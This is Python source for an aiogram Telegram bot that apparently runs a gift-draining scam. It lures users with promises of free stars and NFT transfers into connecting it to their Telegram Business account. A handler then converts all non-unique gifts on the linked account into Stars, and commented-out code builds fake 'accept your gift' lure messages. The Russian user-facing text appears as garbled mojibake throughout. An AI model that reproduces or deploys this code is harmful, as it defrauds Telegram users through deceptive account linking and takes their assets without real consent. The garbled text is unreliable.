from aiogram.types import CallbackQuery
from aiogram import F

@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception as e:
        return await callback.message.edit_text("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    try:
        # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        response = await bot(GetBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts = response.gifts
    except TelegramBadRequest as e:
        return await callback.message.edit_text(f"–û—à–∏–±–∫–∞: {e.message}")
    
    if not gifts:
        return await callback.message.edit_text("üéÅ –£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")

    converted_count = 0
    failed = 0
    for gift in gifts:
        if gift.type == "unique":
            continue

        try:
            print(gift.gift.id)
            await bot(ConvertGiftToStars(
                business_connection_id=connection["business_connection_id"],
                owned_gift_id=str(gift.owned_gift_id)
            ))
            converted_count += 1
        except TelegramBadRequest as e:
            print(e)
            failed += 1
        except Exception as e:
            print(e)
            failed += 1

    await callback.message.edit_text(
        f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ: {converted_count} –ø–æ–¥–∞—Ä–∫–æ–≤.\n"
        f"‚ùå –û—à–∏–±–æ–∫: {failed}"
    )

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    await message.answer("–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")


# –î–æ–±–∞–≤—å—Ç–µ —ç—Ç–æ –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞ –ø–æ—Å–ª–µ –∏–º–ø–æ—Ä—Ç–æ–≤ (–ø–µ—Ä–µ–¥ –≤—Å–µ–º–∏ —Ñ—É–Ω–∫—Ü–∏—è–º–∏):
check_auth = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", callback_data="check_auth")]
    ]
)

# –ó–∞—Ç–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ (–≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ç–µ–ª–µ –∫–æ–¥–∞ —Å –¥—Ä—É–≥–∏–º–∏ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞–º–∏):
@dp.callback_query(F.data == "verify")
async def handle_verify(callback: types.CallbackQuery):
    chat_id = callback.from_user.id
    
    await callback.message.delete()
    
    connections = load_connections()
    user_connected = any(str(chat_id) == str(conn["user_id"]) for conn in connections)
    
    if user_connected:
        await bot.send_message(
            chat_id,
            "‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É!\n\n"
            "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞.",
            parse_mode="HTML"
        )
        return
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –º–µ–¥–∏–∞–≥—Ä—É–ø–ø—É —Å —Ñ–æ—Ç–æ –∏ –ø–æ–¥–ø–∏—Å—è–º–∏
    photos = [
        InputMediaPhoto(
            media=FSInputFile("media/1.jpg"), 
            caption="<b>–í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–∏–≤—è–∑–∞—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å –∞–∫–∫–∞—É–Ω—Ç—É, –∏–Ω–∞—á–µ –≤—ã –Ω–µ —Å–º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∞—Ç—å –∑–≤—ë–∑–¥—ã –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å/–ø—Ä–∏–Ω–∏–º–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏. üéÅ</b>",
            parse_mode="HTML"
        ),
        InputMediaPhoto(media=FSInputFile("media/2.jpg")),
        InputMediaPhoto(media=FSInputFile("media/3.jpg")),
    ]
    
    await bot.send_media_group(chat_id, media=photos)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π
    await bot.send_message(
        chat_id,
        "<b>–ü–æ—à–∞–≥–æ–≤–∞—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è</b>\n"
        "<b>1. –û—Ç–∫—Ä–æ–π—Ç–µ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
        "<b>2. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
        "<b>3. –ù–∞–π–¥–∏—Ç–µ –ø—É–Ω–∫—Ç –ß–∞—Ç-–±–æ—Ç—ã</b>\n"
        "<b>4. –í–≤–µ–¥–∏—Ç–µ @giftexnft_bot –∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è</b>\n"
        "<b>5. –ì–æ—Ç–æ–≤–æ, —Ç–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º!</b>",
        reply_markup=check_auth,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "check_auth")
async def check_auth_handler(callback: types.CallbackQuery):
    chat_id = callback.from_user.id
    connections = load_connections()
    user_connected = any(str(chat_id) == str(conn["user_id"]) for conn in connections)
    
    if user_connected:
        await callback.answer("<b>‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω—ã!</b>", show_alert=True)
        await callback.message.edit_reply_markup(reply_markup=None)
        await bot.send_message(
            chat_id,
            "<b>üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–∏–ª–∏ –±–æ—Ç–∞.</b>\n\n"
            "<b>–¢–µ–ø–µ—Ä—å –≤–∞–º –¥–æ—Å—Ç—É–ø–Ω—ã –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏:</b>\n"
            "<b>‚Ä¢ /work_star - –∑–∞—Ä–∞–±–æ—Ç–æ–∫ –∑–≤—ë–∑–¥ üåü</b>\n"
            "<b>‚Ä¢ /dealsNFT - –ü–µ—Ä–µ–¥–∞—Ç—å NFT –ø–æ–¥–∞—Ä–æ–∫ –±–µ–∑ –ø–æ–º–æ—â–∏ –ó–≤—ë–∑–¥ ü•∞</b>\n"
            "<b>‚Ä¢ /My_NFT - –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ NFT –∏ –ø–æ–ª—É—á–∏—Ç–µ –µ–≥–æ –Ω–∞ —Å–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç! üéÅ</b>\n"
            "<b>‚Ä¢ /my_gifts - –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∞ üëú</b>",
            parse_mode="HTML"
        )
    else:
        await callback.answer("<b>‚ùå –í—ã –µ—â–µ –Ω–µ –ø–æ–¥–∫–ª—é—á–∏–ª–∏ –±–æ—Ç–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–ª–µ–¥—É–π—Ç–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤—ã—à–µ!</b>", show_alert=True)



# @dp.inline_query()
# async def inline_gift_handler(inline_query: InlineQuery):
#     query = inline_query.query.lower()
#
#     if "nft" in query or "gift" in query:
#         # –ü–∞—Ä—Å–∏–º URL NFT
#         nft_url = inline_query.query
#         nft_name = nft_url.split('/')[-1]  # –ü–æ–ª—É—á–∞–µ–º —á–∞—Å—Ç—å –ø–æ—Å–ª–µ –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ /
#         name_part, number_part = nft_name.split('-') if '-' in nft_name else (nft_name, '1')
#
#         builder = InlineKeyboardBuilder()
#         builder.button(
#             text="üéÅ –ü—Ä–∏–Ω—è—Ç—å –ø–æ–¥–∞—Ä–æ–∫",
#             url=f"https://t.me/NFTprlce_robot"
#         )
#         builder.button(
#             text="üñº –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫",
#             url=nft_url
#         )
#         builder.adjust(1)
#
#         result = InlineQueryResultArticle(
#             id="1",
#             title=f"–û—Ç–ø—Ä–∞–≤–∏—Ç—å NFT –ø–æ–¥–∞—Ä–æ–∫: {name_part} #{number_part}",
#             description=f"–ù–∞–∂–º–∏—Ç–µ, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å {name_part} #{number_part}",
#             input_message_content=InputTextMessageContent(
#                 message_text=(
#                     f"<b><a href='{nft_url}'>üíå</a> {name_part} #{number_part}</b>\n\n"
#                     f"üéÅ <i>–ö—Ç–æ-—Ç–æ —Ä–µ—à–∏–ª –≤–∞—Å –ø–æ—Ä–∞–¥–æ–≤–∞—Ç—å ‚Äî –ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –Ω–∞–∂–∞–≤ \"–ü—Ä–∏–Ω—è—Ç—å\"</i>"
#                 ),
#                 parse_mode="HTML"
#             ),
#             reply_markup=builder.as_markup(),
#             thumbnail_url=nft_url
#         )
#
#         await inline_query.answer([result], cache_time=1)

async def health_handler(request):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è health check –æ—Ç Railway"""
    return web.Response(status=200, text="OK")

async def set_webhook():
    """–£—Å—Ç–∞–Ω–æ–≤–∫–∞ webhook –¥–ª—è Telegram —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π –∏ –æ–±—Ä–∞–±–æ—Ç–∫–æ–π —Ñ–ª—É–¥-–∫–æ–Ω—Ç—Ä–æ–ª—è"""
    try:
        webhook_url = f"https://{os.environ.get('RAILWAY_STATIC_URL')}/webhook"
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–∫—É—â–∏–π webhook
        current_webhook = await bot.get_webhook_info()
        if current_webhook.url == webhook_url:
            logging.info(f"Webhook —É–∂–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {webhook_url}")
            return
        
        # –ü—ã—Ç–∞–µ–º—Å—è —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å webhook —Å –ø–æ–≤—Ç–æ—Ä–Ω—ã–º–∏ –ø–æ–ø—ã—Ç–∫–∞–º–∏
        max_retries = 5
        for attempt in range(max_retries):
            try:
                await bot.set_webhook(webhook_url)
                logging.info(f"Webhook —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {webhook_url}")
                return
            except TelegramTooManyRequests as e:
                retry_after = e.retry_after or 1
                logging.warning(f"–§–ª—É–¥-–∫–æ–Ω—Ç—Ä–æ–ª—å Telegram, –ø–æ–≤—Ç–æ—Ä —á–µ—Ä–µ–∑ {retry_after} —Å–µ–∫, –ø–æ–ø—ã—Ç–∫–∞ {attempt + 1}/{max_retries}")
                await asyncio.sleep(retry_after)
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ webhook: {e}")
                return
        logging.error("–ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å webhook –ø–æ—Å–ª–µ –≤—Å–µ—Ö –ø–æ–ø—ã—Ç–æ–∫")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ/—É—Å—Ç–∞–Ω–æ–≤–∫–µ webhook: {e}")

def main():
    app = web.Application()
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
    setup_application(app, dp, bot=bot)
    
    # –î–æ–±–∞–≤–ª—è–µ–º –º–∞—Ä—à—Ä—É—Ç –¥–ª—è health check
    app.add_routes([web.get('/health', health_handler)])
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫—É webhook
    asyncio.run(set_webhook())
    
    port = int(os.environ.get('PORT', 8080))
    web.run_app(app, host='0.0.0.0', port=port)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()